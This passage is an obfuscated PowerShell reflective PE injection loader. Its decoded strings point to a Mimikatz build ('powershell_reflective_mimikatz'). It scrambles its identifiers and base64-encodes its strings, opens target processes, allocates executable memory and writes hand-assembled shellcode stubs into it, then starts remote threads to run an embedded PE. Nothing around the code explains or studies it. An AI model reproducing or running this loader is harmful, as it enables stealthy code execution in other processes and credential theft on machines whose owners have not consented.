		Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AEEAZABkAHIAZQBzAHMAOgAgACQAewBfAF8ALwBcAC8AXAAvAFwAXwAvAFwALwA9AFwALwA9AFwAXwB9ACAAIAAgACAARQBuAGQAQQBkAGQAcgBlAHMAcwA6ACAAJAB7AF8ALwA9AFwALwA9AD0AXABfAC8AXAAvAFwALwA9AFwALwB9AA==')))
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAgAFAARQAgAHMAZQBjAHQAaQBvAG4AcwAgAGkAbgAgAHQAbwAgAG0AZQBtAG8AcgB5AA==')))
		_/===\_/=\/\_/==== -_/=\_/\/\/=\___/=\ ${_/=\_/\/\/=\___/=\} -__/\/\_/\__/\___/= ${__/\/\_/\__/\___/=} -Win32Functions $Win32Functions -Win32Types $Win32Types
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGEAZABkAHIAZQBzAHMAZQBzACAAYgBhAHMAZQBkACAAbwBuACAAdwBoAGUAcgBlACAAdABoAGUAIABQAEUAIAB3AGEAcwAgAGEAYwB0AHUAYQBsAGwAeQAgAGwAbwBhAGQAZQBkACAAaQBuACAAbQBlAG0AbwByAHkA')))
		__/=\__/\_/=\/\___ -__/\/\_/\__/\___/= ${__/\/\_/\__/\___/=} -_/=\_/\/\/\/=\__/\ ${_/=\_/\/\/\/=\__/\} -Win32Constants $Win32Constants -Win32Types $Win32Types
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAIABEAEwATAAnAHMAIABuAGUAZQBkAGUAZAAgAGIAeQAgAHQAaABlACAAUABFACAAdwBlACAAYQByAGUAIABsAG8AYQBkAGkAbgBnAA==')))
		if (${/=\__/=\/==\__/==} -eq $true)
		{
			__/=\_/\/\/==\_/\/ -__/\/\_/\__/\___/= ${__/\/\_/\__/\___/=} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -_/==\_/\/=\/=\/=\_ ${_/==\_/\/=\/=\/=\_}
		}
		else
		{
			__/=\_/\/\/==\_/\/ -__/\/\_/\__/\___/= ${__/\/\_/\__/\___/=} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		if (${/=\__/=\/==\__/==} -eq $false)
		{
			if (${___/=\/=\____/=\_} -eq $true)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAHAAcgBvAHQAZQBjAHQAaQBvAG4AIABmAGwAYQBnAHMA')))
				__/=====\__/\/==\_ -__/\/\_/\__/\___/= ${__/\/\_/\__/\___/=} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAcgBlAGYAbABlAGMAdABpAHYAZQBsAHkAIABsAG8AYQBkAGUAZAAgAGkAcwAgAG4AbwB0ACAAYwBvAG0AcABhAHQAaQBiAGwAZQAgAHcAaQB0AGgAIABOAFgAIABtAGUAbQBvAHIAeQAsACAAawBlAGUAcABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAYQBzACAAcgBlAGEAZAAgAHcAcgBpAHQAZQAgAGUAeABlAGMAdQB0AGUA')))
			}
		}
		else
		{
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAbABvAGEAZABlAGQAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACwAIABuAG8AdAAgAGEAZABqAHUAcwB0AGkAbgBnACAAbQBlAG0AbwByAHkAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMA')))
		}
		if (${/=\__/=\/==\__/==} -eq $true)
		{
			[UInt32]${__/\/=\/\________} = 0
			${_/\/\__/\___/\___} = $Win32Functions.WriteProcessMemory.Invoke(${_/==\_/\/=\/=\/=\_}, ${/====\_/\/=\_/==\}, ${__/\/\/\_/\/=\/=\_}, [UIntPtr](${__/\/\_/\__/\___/=}.SizeOfImage), [Ref]${__/\/=\/\________})
			if (${_/\/\__/\___/\___} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
		}
		if (${__/\/\_/\__/\___/=}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
		{
			if (${/=\__/=\/==\__/==} -eq $false)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaABhAHMAIABiAGUAZQBuACAAbABvAGEAZABlAGQA')))
				${_/==\/\/\/\/\__/\} = _/=\/=\_/\/=\_/=== (${__/\/\_/\__/\___/=}.PEHandle) (${__/\/\_/\__/\___/=}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				${_/=\/===\/====\__} = __/====\_/\___/\_/ @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${___/===\____/==\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/==\/\/\/\/\__/\}, ${_/=\/===\/====\__})
				${___/===\____/==\_}.Invoke(${__/\/\_/\__/\___/=}.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				${_/==\/\/\/\/\__/\} = _/=\/=\_/\/=\_/=== (${/====\_/\/=\_/==\}) (${__/\/\_/\__/\___/=}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				if (${__/\/\_/\__/\___/=}.PE64Bit -eq $true)
				{
					${_/\_/\/\/\______/} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${___/=\_/\/\/===\_} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${_/\__/==\_/==\_/\} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					${_/\_/\/\/\______/} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${___/=\_/\/\/===\_} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${_/\__/==\_/==\_/\} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${/==\___/\/\/\/\_/} = ${_/\_/\/\/\______/}.Length + ${___/=\_/\/\/===\_}.Length + ${_/\__/==\_/==\_/\}.Length + (${_/=\/==\____/==\_} * 2)
				${_/\/\/\/\/=\_/=\_} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/==\___/\/\/\/\_/})
				${_/====\__/==\____} = ${_/\/\/\/\/=\_/=\_}
				__/\_/====\/==\/\_ -____/\___/\/===\/= ${_/\_/\/\/\______/} -___/==\/=\_/\_/\/\ ${_/\/\/\/\/=\_/=\_}
				${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${_/\_/\/\/\______/}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/====\_/\/=\_/==\}, ${_/\/\/\/\/=\_/=\_}, $false)
				${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${_/=\/==\____/==\_})
				__/\_/====\/==\/\_ -____/\___/\/===\/= ${___/=\_/\/\/===\_} -___/==\/=\_/\_/\/\ ${_/\/\/\/\/=\_/=\_}
				${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${___/=\_/\/\/===\_}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/==\/\/\/\/\__/\}, ${_/\/\/\/\/=\_/=\_}, $false)
				${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${_/=\/==\____/==\_})
				__/\_/====\/==\/\_ -____/\___/\/===\/= ${_/\__/==\_/==\_/\} -___/==\/=\_/\_/\/\ ${_/\/\/\/\/=\_/=\_}
				${_/\/\/\/\/=\_/=\_} = _/=\/=\_/\/=\_/=== ${_/\/\/\/\/=\_/=\_} (${_/\__/==\_/==\_/\}.Length)
				${/==\_/===\___/\/\} = $Win32Functions.VirtualAllocEx.Invoke(${_/==\_/\/=\/=\/=\_}, [IntPtr]::Zero, [UIntPtr][UInt64]${/==\___/\/\/\/\_/}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if (${/==\_/===\___/\/\} -eq [IntPtr]::Zero)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
				}
				${_/\/\__/\___/\___} = $Win32Functions.WriteProcessMemory.Invoke(${_/==\_/\/=\/=\/=\_}, ${/==\_/===\___/\/\}, ${_/====\__/==\____}, [UIntPtr][UInt64]${/==\___/\/\/\/\_/}, [Ref]${__/\/=\/\________})
				if ((${_/\/\__/\___/\___} -eq $false) -or ([UInt64]${__/\/=\/\________} -ne [UInt64]${/==\___/\/\/\/\_/}))
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
				}
				${________/\_/\__/=} = _/=\/=\____/\____/ -_____/====\/\/==\_ ${_/==\_/\/=\/=\/=\_} -___/==\/\/\_______ ${/==\_/===\___/\/\} -Win32Functions$Win32Functions 
				${/====\___/\/=\/==} = $Win32Functions.WaitForSingleObject.Invoke(${________/\_/\__/=}, 20000)
				if (${/====\___/\/=\/==} -ne 0)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
				}
				$Win32Functions.VirtualFreeEx.Invoke(${_/==\_/\/=\/=\/=\_}, ${/==\_/===\___/\/\}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif (${__/\/\_/\__/\___/=}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA'))))
		{
			[IntPtr]${___/\/\/==\/===\/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte(${___/\/\/==\/===\/=}, 0, 0x00)
			${_/=\__/==\_/\__/=} = _/====\___/\_/\/== -__/\/\_/\__/\___/= ${__/\/\_/\__/\___/=} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -___/=\__/==\__/\__ ${__/\___/\__/===\_/} -___/\/\/==\/===\/= ${___/\/\/==\/===\/=}
			[IntPtr]${/===\/=\/\_/==\/\} = _/=\/=\_/\/=\_/=== (${__/\/\_/\__/\___/=}.PEHandle) (${__/\/\_/\__/\___/=}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAEUAWABFACAATQBhAGkAbgAgAGYAdQBuAGMAdABpAG8AbgAuACAAQQBkAGQAcgBlAHMAcwA6ACAAJAB7AC8APQA9AD0AXAAvAD0AXAAvAFwAXwAvAD0APQBcAC8AXAB9AC4AIABDAHIAZQBhAHQAaQBuAGcAIAB0AGgAcgBlAGEAZAAgAGYAbwByACAAdABoAGUAIABFAFgARQAgAHQAbwAgAHIAdQBuACAAaQBuAC4A')))
			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, ${/===\/=\/\_/==\/\}, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]${___/==\_/===\__/=} = [System.Runtime.InteropServices.Marshal]::ReadByte(${___/\/\/==\/===\/=}, 0)
				if (${___/==\_/===\__/=} -eq 1)
				{
					__/=\/\/======\___ -_/===\/\/=\/====\_ ${_/=\__/==\_/\__/=} -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAIAB0AGgAcgBlAGEAZAAgAGgAYQBzACAAYwBvAG0AcABsAGUAdABlAGQALgA=')))
					break
				}
				else
				{
					sleep -Seconds 1
				}
			}
		}
		return @(${__/\/\_/\__/\___/=}.PEHandle, ${/====\_/\/=\_/==\})
	}
	Function ____/=\/\/=\/\__/\
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${__/\/\/\_/\/=\/=\_}
		)
		$Win32Constants = ___/====\_/\/==\/\
		$Win32Functions = _/=\_/=\/\/\/=\/\/
		$Win32Types = __/\_/==\__/\/==\/
		${__/\/\_/\__/\___/=} = _/==\_/=\/\/=\/==\ -__/\/\/\_/\/=\/=\_ ${__/\/\/\_/\/=\/=\_} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (${__/\/\_/\__/\___/=}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${_/\__/=\_/\/=\/\_} = _/=\/=\_/\/=\_/=== ([Int64]${__/\/\_/\__/\___/=}.PEHandle) ([Int64]${__/\/\_/\__/\___/=}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${__/\/\/\_/\_/\_/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\__/=\_/\/=\/\_}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${__/\/\/\_/\_/\_/\}.Characteristics -eq 0 `
						-and ${__/\/\/\_/\_/\_/\}.FirstThunk -eq 0 `
						-and ${__/\/\/\_/\_/\_/\}.ForwarderChain -eq 0 `
						-and ${__/\/\/\_/\_/\_/\}.Name -eq 0 `
						-and ${__/\/\/\_/\_/\_/\}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAHUAbgBsAG8AYQBkAGkAbgBnACAAdABoAGUAIABsAGkAYgByAGEAcgBpAGUAcwAgAG4AZQBlAGQAZQBkACAAYgB5ACAAdABoAGUAIABQAEUA')))
					break
				}
				${_/=\_/\_/=\/\_/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((_/=\/=\_/\/=\_/=== ([Int64]${__/\/\_/\__/\___/=}.PEHandle) ([Int64]${__/\/\/\_/\_/\_/\}.Name)))
				${___/\/\__/=\/\/==} = $Win32Functions.GetModuleHandle.Invoke(${_/=\_/\_/=\/\_/=\})
				if (${___/\/\__/=\/\/==} -eq $null)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAZwBlAHQAdABpAG4AZwAgAEQATABMACAAaABhAG4AZABsAGUAIABpAG4AIABNAGUAbQBvAHIAeQBGAHIAZQBlAEwAaQBiAHIAYQByAHkALAAgAEQATABMAE4AYQBtAGUAOgAgACQAewBfAC8APQBcAF8ALwBcAF8ALwA9AFwALwBcAF8ALwA9AFwAfQAuACAAQwBvAG4AdABpAG4AdQBpAG4AZwAgAGEAbgB5AHcAYQB5AHMA'))) -WarningAction Continue
				}
				${_/\/\__/\___/\___} = $Win32Functions.FreeLibrary.Invoke(${___/\/\__/=\/\/==})
				if (${_/\/\__/\___/\___} -eq $false)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABmAHIAZQBlACAAbABpAGIAcgBhAHIAeQA6ACAAJAB7AF8ALwA9AFwAXwAvAFwAXwAvAD0AXAAvAFwAXwAvAD0AXAB9AC4AIABDAG8AbgB0AGkAbgB1AGkAbgBnACAAYQBuAHkAdwBhAHkAcwAuAA=='))) -WarningAction Continue
				}
				${_/\__/=\_/\/=\/\_} = _/=\/=\_/\/=\_/=== (${_/\__/=\_/\/=\/\_}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaQBzACAAYgBlAGkAbgBnACAAdQBuAGwAbwBhAGQAZQBkAA==')))
		${_/==\/\/\/\/\__/\} = _/=\/=\_/\/=\_/=== (${__/\/\_/\__/\___/=}.PEHandle) (${__/\/\_/\__/\___/=}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		${_/=\/===\/====\__} = __/====\_/\___/\_/ @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${___/===\____/==\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/==\/\/\/\/\__/\}, ${_/=\/===\/====\__})
		${___/===\____/==\_}.Invoke(${__/\/\_/\__/\___/=}.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		${_/\/\__/\___/\___} = $Win32Functions.VirtualFree.Invoke(${__/\/\/\_/\/=\/=\_}, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if (${_/\/\__/\___/\___} -eq $false)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
		}
	}
	Function ________/\_/\/==\/
	{
		$Win32Functions = _/=\_/=\/\/\/=\/\/
		$Win32Types = __/\_/==\__/\/==\/
		$Win32Constants =  ___/====\_/\/==\/\
		${_/==\_/\/=\/=\/=\_} = [IntPtr]::Zero
		if ((${/=\/\_/\____/==\/} -ne $null) -and (${/=\/\_/\____/==\/} -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAcwB1AHAAcABsAHkAIABhACAAUAByAG8AYwBJAGQAIABhAG4AZAAgAFAAcgBvAGMATgBhAG0AZQAsACAAYwBoAG8AbwBzAGUAIABvAG4AZQAgAG8AcgAgAHQAaABlACAAbwB0AGgAZQByAA==')))
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			${/=\_/=\_/=\/\/\_/} = @(ps -Name $ProcName -ErrorAction SilentlyContinue)
			if (${/=\_/=\_/=\/\/\_/}.Count -eq 0)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAZgBpAG4AZAAgAHAAcgBvAGMAZQBzAHMAIAAkAFAAcgBvAGMATgBhAG0AZQA=')))
			}
			elseif (${/=\_/=\_/=\/\/\_/}.Count -gt 1)
			{
				${/===\_/\____/=\_/} = ps | where { $_.Name -eq $ProcName } | select ProcessName, Id, SessionId
				echo ${/===\_/\____/=\_/}
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHIAZQAgAHQAaABhAG4AIABvAG4AZQAgAGkAbgBzAHQAYQBuAGMAZQAgAG8AZgAgACQAUAByAG8AYwBOAGEAbQBlACAAZgBvAHUAbgBkACwAIABwAGwAZQBhAHMAZQAgAHMAcABlAGMAaQBmAHkAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABJAEQAIAB0AG8AIABpAG4AagBlAGMAdAAgAGkAbgAgAHQAbwAuAA==')))
			}
			else
			{
				${/=\/\_/\____/==\/} = ${/=\_/=\_/=\/\/\_/}[0].ID
			}
		}
		if ((${/=\/\_/\____/==\/} -ne $null) -and (${/=\/\_/\____/==\/} -ne 0))
		{
			${_/==\_/\/=\/=\/=\_} = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, ${/=\/\_/\____/==\/})
			if (${_/==\_/\/=\/=\/=\_} -eq [IntPtr]::Zero)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbwBiAHQAYQBpAG4AIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIABwAHIAbwBjAGUAcwBzACAASQBEADoAIAAkAHsALwA9AFwALwBcAF8ALwBcAF8AXwBfAF8ALwA9AD0AXAAvAH0A')))
			}
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBvAHQAIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIAB0AGgAZQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAHQAbwAgAGkAbgBqAGUAYwB0ACAAaQBuACAAdABvAA==')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAEkAbgB2AG8AawBlAC0ATQBlAG0AbwByAHkATABvAGEAZABMAGkAYgByAGEAcgB5AA==')))
        try
        {
            ${__/\___/\_/=\____} = gwmi -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }
        if (${__/\___/\_/=\____} -is [array])
        {
            ${/=\/\__/\_/\___/=} = ${__/\___/\_/=\____}[0]
        } else {
            ${/=\/\__/\_/\___/=} = ${__/\___/\_/=\____}
        }
        if ( ( ${/=\/\__/\_/\___/=}.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUAOgAgAA=='))) + ${/=\/\__/\_/\___/=}.AddressWidth + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABQAHIAbwBjAGUAcwBzADoAIAA='))) + ([System.IntPtr]::Size * 8))
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAGEAcgBjAGgAaQB0AGUAYwB0AHUAcgBlACAAKAAzADIAYgBpAHQALwA2ADQAYgBpAHQAKQAgAGQAbwBlAHMAbgAnAHQAIABtAGEAdABjAGgAIABPAFMAIABhAHIAYwBoAGkAdABlAGMAdAB1AHIAZQAuACAANgA0AGIAaQB0ACAAUABTACAAbQB1AHMAdAAgAGIAZQAgAHUAcwBlAGQAIABvAG4AIABhACAANgA0AGIAaQB0ACAATwBTAC4A'))) -ErrorAction Stop
        }
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]${_/=\_/\/\/=\___/=\} = [Byte[]][Convert]::FromBase64String(${/===\/=\__/===\__})
        }
        else
        {
            [Byte[]]${_/=\_/\/\/=\___/=\} = [Byte[]][Convert]::FromBase64String(${__/\/\_/=\/\/\/==})
        }
        ${_/=\_/\/\/=\___/=\}[0] = 0
        ${_/=\_/\/\/=\___/=\}[1] = 0
		${__/\/\/\_/\/=\/=\_} = [IntPtr]::Zero
		if (${_/==\_/\/=\/=\/=\_} -eq [IntPtr]::Zero)
		{
			${__/===\/\_/\__/=\} = __/\__/\_/\____/== -_/=\_/\/\/=\___/=\ ${_/=\_/\/\/=\___/=\} -__/\___/\__/===\_/ ${__/\___/\__/===\_/}
		}
		else
		{
			${__/===\/\_/\__/=\} = __/\__/\_/\____/== -_/=\_/\/\/=\___/=\ ${_/=\_/\/\/=\___/=\} -__/\___/\__/===\_/ ${__/\___/\__/===\_/} -_/==\_/\/=\/=\/=\_ ${_/==\_/\/=\/=\/=\_}
		}
		if (${__/===\/\_/\__/=\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABsAG8AYQBkACAAUABFACwAIABoAGEAbgBkAGwAZQAgAHIAZQB0AHUAcgBuAGUAZAAgAGkAcwAgAE4AVQBMAEwA')))
		}
		${__/\/\/\_/\/=\/=\_} = ${__/===\/\_/\__/=\}[0]
		${_/\__/\_/\_/\_/=\} = ${__/===\/\_/\__/=\}[1] 
		${__/\/\_/\__/\___/=} = _/==\_/=\/\/=\/==\ -__/\/\/\_/\/=\/=\_ ${__/\/\/\_/\/=\/=\_} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if ((${__/\/\_/\__/\___/=}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${_/==\_/\/=\/=\/=\_} -eq [IntPtr]::Zero))
		{
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABXAFMAdAByAGkAbgBnACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
				    [IntPtr]${/===\/=\/\_/====\} = ___/=\___/\/=\__/= -__/\/\/\_/\/=\/=\_ ${__/\/\/\_/\/=\/=\_} -__/\___/\__/\__/=\ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABvAHcAZQByAHMAaABlAGwAbABfAHIAZQBmAGwAZQBjAHQAaQB2AGUAXwBtAGkAbQBpAGsAYQB0AHoA')))
				    if (${/===\/=\/\_/====\} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${_/\_/\_/==\__/\__} = __/====\_/\___/\_/ @([IntPtr]) ([IntPtr])
				    ${/==\__/\_/==\/\/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/===\/=\/\_/====\}, ${_/\_/\_/==\__/\__})
                    ${__/=\____/\____/\} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${__/\___/\__/===\_/})
				    [IntPtr]${/==\/=\/\/==\__/=} = ${/==\__/\_/==\/\/=}.Invoke(${__/=\____/\____/\})
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${__/=\____/\____/\})
				    if (${/==\/=\/\/==\__/=} -eq [IntPtr]::Zero)
				    {
				    	Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAG8AdQB0AHAAdQB0ACwAIABPAHUAdABwAHUAdAAgAFAAdAByACAAaQBzACAATgBVAEwATAA=')))
				    }
				    else
				    {
				        ${/==\_/\/==\/=\__/} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${/==\/=\/\/==\__/=})
				        echo ${/==\_/\/==\/=\__/}
				        $Win32Functions.LocalFree.Invoke(${/==\/=\/\/==\__/=});
				    }
		}
		elseif ((${__/\/\_/\__/\___/=}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${_/==\_/\/=\/=\/=\_} -ne [IntPtr]::Zero))
		{
			${/=\/\/=\/===\/=\_} = ___/=\___/\/=\__/= -__/\/\/\_/\/=\/=\_ ${__/\/\/\_/\/=\/=\_} -__/\___/\__/\__/=\ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
			if ((${/=\/\/=\/===\/=\_} -eq $null) -or (${/=\/\/=\/===\/=\_} -eq [IntPtr]::Zero))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjACAAYwBvAHUAbABkAG4AJwB0ACAAYgBlACAAZgBvAHUAbgBkACAAaQBuACAAdABoAGUAIABEAEwATAA=')))
			}
			${/=\/\/=\/===\/=\_} = __/\__/=\/===\/=== ${/=\/\/=\/===\/=\_} ${__/\/\/\_/\/=\/=\_}
